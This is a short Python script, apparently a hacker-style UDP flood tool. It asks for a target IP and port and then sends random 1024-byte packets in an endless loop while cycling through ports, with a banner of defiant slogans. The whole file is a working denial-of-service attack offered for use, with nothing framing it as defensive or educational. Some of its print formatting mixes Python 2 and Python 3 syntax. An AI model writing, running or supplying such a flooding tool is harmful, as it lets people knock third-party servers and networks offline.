import socket, os, random, time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
ip = 0
port = 0
sent = 0
 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
os.system("clear")
print (R+"#FVCK 50C137Y")
print (B+"#FR33D0M I5 4N I11U510N"+N)
print
ip = raw_input("[$] TARGET IP: ")
port = input("[$] PORT: ")
os.system("clear")
time.sleep(2)
print()
while True:
	sock.sendto(bytes, (ip,port))
	sent = sent + 1
	port = port + 1
	print("Sent %s packet to %s through port: %s") % (sent,ip,port)
	if port == 65534: # Once it reaches the max, go back to the min
		port = 1
